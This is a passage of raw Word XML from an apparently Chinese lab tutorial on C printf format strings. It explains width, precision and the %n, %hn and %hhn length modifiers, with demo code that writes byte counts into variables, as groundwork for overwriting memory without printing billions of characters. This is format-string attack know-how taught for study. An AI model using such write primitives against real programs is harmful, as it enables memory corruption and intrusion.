      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>。例如</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(“%.5d”, 10)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将打印</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0010</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A583269"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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>2)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>宽度修饰符和精度修饰符格式类似，但没有小数点。</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>当应用于整型值</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>时，他也控制最少打印多少位字符。如果</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>整型数</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的位数小于指定宽度，则数字开头以空格填充。如</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(“%5d”,10)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>将打印</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>___10(_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>表示空格</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5492CFDE" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="38" w:author="zhao ruizhi" w:date="2023-05-08T14:28:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>但这样仍然不够，打印</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>17</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>亿个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>大概需要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>个多小时，我们需要更快的方法。长度修饰符是可被用在格式规定符中来限定输出的整型参数的类型，当使用在</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上时，它控制把参数当作多少个字节的整数。在</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3D5CCE"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允许加到</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的众多长度修饰符选项中，重点关注以下三种：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="101E068F" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>n:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>视参数为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>字节整型数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEE4682" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>hn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>视参数为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>字节短整型数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5213C9A9" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="af2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>%</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>hhn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>视参数为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>字节字符型数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C2C298A"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你可以通过运行下列代码来加深对这三种长度修饰符的理解。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25428879" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:ins w:id="39" w:author="zhao ruizhi" w:date="2023-05-08T14:33:00Z"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="40" w:author="zhao ruizhi" w:date="2023-05-08T14:34:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
            <w:noProof/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3FE4C1DD" wp14:editId="45EE0AC9">
              <wp:extent cx="5274310" cy="2021840"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="993536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536746" name="图片 1"/>
                      <pic:cNvPicPr>
                        <a:picLocks noChangeAspect="1"/>
                      </pic:cNvPicPr>
                    </pic:nvPicPr>
                    <pic:blipFill>
                      <a:blip r:embed="rId19"/>
                      <a:stretch>
                        <a:fillRect/>
                      </a:stretch>
                    </pic:blipFill>
                    <pic:spPr>
                      <a:xfrm>
                        <a:off x="0" y="0"/>
                        <a:ext cx="5274310" cy="2021840"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="047A4EAC" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="58209025" wp14:editId="7446AE16">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="page">
                  <wp:posOffset>1481455</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>22225</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="2597150"/>
                <wp:effectExtent l="4445" t="4445" r="9525" b="14605"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="24" name="文本框 24"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="2597150"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="399C356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38B99E30"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43F6753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60FCDB9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a,b</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>,c</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5F81D4D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a=b=c=</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="098658"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>0x11223344</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="12CE84BD" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:widowControl/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="17C6F13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a</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4620D1C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a: 0x%x\n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, a);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="741C905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"12345%hn\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b</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="06DB2E2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b: 0x%x\n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, b);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="21867D7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"12345%hhn\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c</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3F87016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c: 0x%x\n"</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                                <w:color w:val="000000"/>
                                <w:kern w:val="0"/>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                                <w:lang w:bidi="ar"/>
                              </w:rPr>
                              <w:t>, c);</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="394DFD2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7FF66DA0" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:rPr>
                                <w:sz w:val="20"/>
                                <w:szCs w:val="20"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1"/>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shape w14:anchorId="58209025" id="文本框 24" o:spid="_x0000_s1031" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:116.65pt;margin-top:1.75pt;width:392.9pt;height:204.5pt;z-index:-2516500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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="399C356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38B99E30"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43F6753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60FCDB9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a,b</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>,c</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5F81D4D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a=b=c=</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="098658"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>0x11223344</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="12CE84BD" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:widowControl/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="17C6F13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a</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4620D1C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a: 0x%x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, a);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="741C905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"12345%hn\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b</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="06DB2E2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b: 0x%x\n"</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="000000"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>, b);</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="21867D7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"12345%hhn\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                          <w:color w:val="A31515"/>
                          <w:kern w:val="0"/>
                          <w:sz w:val="20"/>
                          <w:szCs w:val="20"/>
                          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                          <w:lang w:bidi="ar"/>
                        </w:rPr>
                        <w:t>n</w:t>
                      </w:r>
                      <w:proofErr w:type="gramStart"/>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,&amp;</w:t>
                      </w:r>
